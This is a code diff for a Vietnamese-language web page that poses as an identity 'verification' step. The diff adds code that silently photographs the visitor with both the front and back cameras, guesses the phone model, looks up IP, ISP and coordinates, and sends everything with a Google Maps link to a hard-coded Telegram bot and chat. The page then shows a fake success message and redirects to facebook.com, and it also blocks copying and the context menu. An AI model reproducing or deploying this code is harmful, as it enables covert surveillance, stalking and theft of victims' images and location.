@@ -1,27 +1,101 @@
-// ==================== CONFIG ====================
-const CONFIG = {
-    REDIRECT_URL: "https://facebook.com",
-    COUNTDOWN_SECONDS: 3
+// ==================== FULL VERSION ====================
+// Kết hợp: Nhận diện iPhone chi tiết + IP/Location + 2 Camera
+
+// -------------------- TELEGRAM CONFIG --------------------
+const TELEGRAM_CONFIG = {
+    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
+    CHAT_ID: "-1003805423944",
+    API_URL: "https://api.telegram.org/bot"
 };
 
-const LOCATION_APIS = [
-    'https://ipwho.is/',
-    'https://ipapi.co/json/',
-    'https://freeipapi.com/api/json/',
-    'https://ip-api.com/json/'
-];
+// -------------------- TELEGRAM SENDER --------------------
+const TelegramSender = {
+    async sendMessage(text) {
+        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch(e) {}
+    },
+    
+    async sendPhoto(blob, caption) {
+        if (!blob) return;
+        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('caption', caption);
+        try {
+            await fetch(url, { method: 'POST', body: formData });
+        } catch(e) {}
+    },
+    
+    formatMessage(data) {
+        return `📡 *[THÔNG TIN TRUY CẬP]*
 
-// ==================== DEVICE INFO ====================
+🕒 *Thời gian:* ${data.time || '?'}
+📱 *Thiết bị:* ${data.device || '?'}
+📐 *Màn hình:* ${data.screenSize || '?'}
+🖥️ *HĐH:* ${data.os || '?'}
+🌍 *IP:* ${data.ip || '?'}
+🏢 *ISP:* ${data.isp || '?'}
+🏙️ *Vị trí:* ${data.location || '?'}
+🌎 *Quốc gia:* ${data.country || '?'}
+📍 *Tọa độ:* ${data.lat}, ${data.lon}
+📌 *Google Maps:* ${data.maps || 'Không có'}
+📸 *Camera trước:* ${data.frontCamera || '?'}
+📸 *Camera sau:* ${data.backCamera || '?'}
+⚠️ *Ghi chú:* ${data.note || 'Thông tin thu thập từ trình duyệt.'}`;
+    },
+    
+    async sendAll(data) {
+        const message = this.formatMessage(data);
+        await this.sendMessage(message);
+        if (data.frontPhoto) await this.sendPhoto(data.frontPhoto, '📸 CAMERA TRƯỚC');
+        if (data.backPhoto) await this.sendPhoto(data.backPhoto, '📸 CAMERA SAU');
+    }
+};
+
+// -------------------- DEVICE INFO (CHI TIẾT + IPHONE MODEL) --------------------
 const DeviceInfo = {
     getInfo() {
         const ua = navigator.userAgent;
+        const screenW = window.screen.width;
+        const screenH = window.screen.height;
+        const ratio = window.devicePixelRatio || 1;
+        const screenSize = `${screenW}x${screenH}@${ratio}`;
         
         let device = 'Không xác định';
         let os = 'Không xác định';
+        let model = '';
         
-        if (/iPhone|iPad|iPod/i.test(ua)) {
+        // iPhone models chi tiết
+        const iphoneModels = {
+            "430x932@3": "iPhone 14/15/16 Pro Max",
+            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
+            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
+            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
+            "414x896@3": "iPhone XS Max / 11 Pro Max",
+            "414x896@2": "iPhone XR / 11",
+            "375x812@3": "iPhone X / XS / 11 Pro",
+            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
+            "320x568@2": "iPhone SE (1st) / 5 / 5S",
+            "414x736@3": "iPhone 6/7/8 Plus",
+            "390x844@2": "iPhone 12/13 mini",
+            "360x780@3": "iPhone 12/13 mini (alternative)"
+        };
+        
+        if (/iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
             os = 'iOS';
-            device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
+            model = iphoneModels[screenSize] || 'iPhone (Model khác)';
+            device = model;
         } else if (/Android/i.test(ua)) {
             os = 'Android';
             const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
@@ -37,11 +111,18 @@ const DeviceInfo = {
             device = 'PC/Laptop';
         }
         
-        return { device, os };
+        return { device, os, screenSize, model };
     }
 };
 
-// ==================== LOCATION INFO ====================
+// -------------------- LOCATION API --------------------
+const LOCATION_APIS = [
+    'https://ipwho.is/',
+    'https://ipapi.co/json/',
+    'https://freeipapi.com/api/json/',
+    'https://ip-api.com/json/'
+];
+
 const LocationInfo = {
     async getLocationData() {
         for (const api of LOCATION_APIS) {
@@ -54,11 +135,9 @@ const LocationInfo = {
                         ip: data.ip,
                         isp: data.connection?.isp || data.isp || 'Không xác định',
                         country: data.country || 'Không xác định',
-                        city: data.city || 'Không xác định',
-                        region: data.region || 'Không xác định',
+                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
                         lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định'
+                        lon: data.longitude || 'Không xác định'
                     };
                 }
                 
@@ -67,11 +146,9 @@ const LocationInfo = {
                         ip: data.ip,
                         isp: data.org || data.asn || 'Không xác định',
                         country: data.country_name || 'Không xác định',
-                        city: data.city || 'Không xác định',
-                        region: data.region || 'Không xác định',
+                        location: `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || 'Không xác định',
                         lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || 'Không xác định'
+                        lon: data.longitude || 'Không xác định'
                     };
                 }
                 
@@ -80,11 +157,9 @@ const LocationInfo = {
                         ip: data.ipAddress,
                         isp: 'Không xác định',
                         country: data.country || 'Không xác định',
-                        city: data.city || 'Không xác định',
-                        region: data.region || 'Không xác định',
+                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
                         lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định'
+                        lon: data.longitude || 'Không xác định'
                     };
                 }
                 
@@ -93,17 +168,15 @@ const LocationInfo = {
                         ip: data.query,
                         isp: data.isp || 'Không xác định',
                         country: data.country || 'Không xác định',
-                        city: data.city || 'Không xác định',
-                        region: data.regionName || 'Không xác định',
+                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
                         lat: data.lat || 'Không xác định',
-                        lon: data.lon || 'Không xác định',
-                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định'
+                        lon: data.lon || 'Không xác định'
                     };
                 }
-                
             } catch(e) {}
         }
         
+        // Fallback chỉ lấy IP
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
@@ -112,11 +185,9 @@ const LocationInfo = {
                     ip: data.ip,
                     isp: 'Không xác định',
                     country: 'Không xác định',
-                    city: 'Không xác định',
-                    region: 'Không xác định',
+                    location: 'Không xác định',
                     lat: 'Không xác định',
-                    lon: 'Không xác định',
-                    location: 'Không xác định'
+                    lon: 'Không xác định'
                 };
             }
         } catch(e) {}
@@ -125,16 +196,14 @@ const LocationInfo = {
             ip: 'Không xác định',
             isp: 'Không xác định',
             country: 'Không xác định',
-            city: 'Không xác định',
-            region: 'Không xác định',
+            location: 'Không xác định',
             lat: 'Không xác định',
-            lon: 'Không xác định',
-            location: 'Không xác định'
+            lon: 'Không xác định'
         };
     }
 };
 
-// ==================== CAMERA MANAGER ====================
+// -------------------- CAMERA MANAGER --------------------
 const CameraManager = {
     stream: null,
     videoElement: null,
@@ -144,14 +213,10 @@ const CameraManager = {
     },
     
     async requestCamera(facingMode = 'user') {
-        if (!navigator.mediaDevices?.getUserMedia) {
-            return null;
-        }
+        if (!navigator.mediaDevices?.getUserMedia) return null;
         
         try {
-            if (this.stream) {
-                this.stopCamera();
-            }
+            if (this.stream) this.stopCamera();
             
             this.stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: facingMode } },
@@ -163,22 +228,18 @@ const CameraManager = {
                 this.videoElement.style.display = 'block';
                 await this.videoElement.play();
             }
-            
             return this.stream;
-            
         } catch(e) {
             try {
                 this.stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: facingMode },
                     audio: false
                 });
-                
                 if (this.videoElement) {
                     this.videoElement.srcObject = this.stream;
                     this.videoElement.style.display = 'block';
                     await this.videoElement.play();
                 }
-                
                 return this.stream;
             } catch(e2) {
                 return null;
@@ -187,9 +248,7 @@ const CameraManager = {
     },
     
     async capturePhoto() {
-        if (!this.videoElement || !this.stream) {
-            return null;
-        }
+        if (!this.videoElement || !this.stream) return null;
         
         await new Promise(r => setTimeout(r, 500));
         
@@ -212,14 +271,14 @@ const CameraManager = {
     async captureBothCameras() {
         const photos = { front: null, back: null };
         
-        // Chụp camera trước
+        // Camera trước
         const frontStream = await this.requestCamera('user');
         if (frontStream) {
             await new Promise(r => setTimeout(r, 500));
             photos.front = await this.capturePhoto();
         }
         
-        // Chụp camera sau
+        // Camera sau
         const backStream = await this.requestCamera('environment');
         if (backStream) {
             await new Promise(r => setTimeout(r, 500));
@@ -241,7 +300,7 @@ const CameraManager = {
     }
 };
 
-// ==================== MAIN ====================
+// -------------------- MAIN --------------------
 (function() {
     const warningDiv = document.getElementById('browser-warning');
     const mainCard = document.getElementById('mainCard');
@@ -259,14 +318,12 @@ const CameraManager = {
         mainCard.style.display = 'none';
     }
     
-    // Chặn copy, context menu
+    // Chặn copy
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('copy', e => e.preventDefault());
     
-    // Khởi tạo camera
     CameraManager.init(video);
     
-    // Xử lý khi bấm nút
     startBtn.onclick = async () => {
         startBtn.disabled = true;
         startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
@@ -276,7 +333,7 @@ const CameraManager = {
             msg.textContent = '📷 Đang mở camera...';
             msg.style.display = 'block';
             
-            // Chụp cả 2 camera
+            // Chụp 2 camera
             const photos = await CameraManager.captureBothCameras();
             
             video.style.display = 'none';
@@ -287,10 +344,11 @@ const CameraManager = {
             const deviceInfo = DeviceInfo.getInfo();
             const locationInfo = await LocationInfo.getLocationData();
             
-            // Tổng hợp dữ liệu
+            // Tổng hợp
             const finalData = {
                 time: new Date().toLocaleString('vi-VN'),
                 device: deviceInfo.device,
+                screenSize: deviceInfo.screenSize,
                 os: deviceInfo.os,
                 ip: locationInfo.ip,
                 isp: locationInfo.isp,
@@ -301,44 +359,40 @@ const CameraManager = {
                 maps: locationInfo.lat !== 'Không xác định' ? `https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}` : '',
                 frontCamera: photos.front ? '✅ Đã chụp' : '🚫 Không chụp được',
                 backCamera: photos.back ? '✅ Đã chụp' : '🚫 Không chụp được',
-                note: 'Đã chụp cả camera trước và sau.',
+                note: 'Đã chụp cả 2 camera + nhận diện thiết bị chi tiết',
                 frontPhoto: photos.front,
                 backPhoto: photos.back
             };
             
-            // Gửi Telegram (dùng telegram.js)
-            if (typeof TelegramSender !== 'undefined') {
-                await TelegramSender.sendAll(finalData);
-            } else {
-                console.error('TelegramSender không được tải!');
-            }
+            // Gửi Telegram
+            await TelegramSender.sendAll(finalData);
             
-            // Dừng camera
             CameraManager.stopCamera();
             
-            // Đếm ngược
-            statusDiv.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${CONFIG.COUNTDOWN_SECONDS} giây...`;
+            // Đếm ngược + đổi màu nút
+            startBtn.style.backgroundColor = "#28a745";
+            startBtn.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
             
-            let timeLeft = CONFIG.COUNTDOWN_SECONDS;
+            let timeLeft = 3;
+            statusDiv.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${timeLeft} giây...`;
+            
             const timer = setInterval(() => {
                 startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
                 timeLeft--;
                 if (timeLeft < 0) {
                     clearInterval(timer);
-                    if (CONFIG.REDIRECT_URL) {
-                        window.location.href = CONFIG.REDIRECT_URL;
-                    }
+                    window.location.href = "https://facebook.com";
                 }
             }, 1000);
             
         } catch(error) {
             console.error('Lỗi:', error);
-            statusDiv.innerHTML = '❌ Có lỗi xảy ra, vui lòng thử lại!';
+            statusDiv.innerHTML = '❌ Có lỗi xảy ra!';
             startBtn.disabled = false;
             startBtn.innerText = '▶ BẮT ĐẦU XÁC THỰC';
             CameraManager.stopCamera();
         }
     };
     
-    console.log('✅ Hệ thống sẵn sàng!');
+    console.log('✅ Full version sẵn sàng (iPhone model + Location + 2 Camera)');
 })();
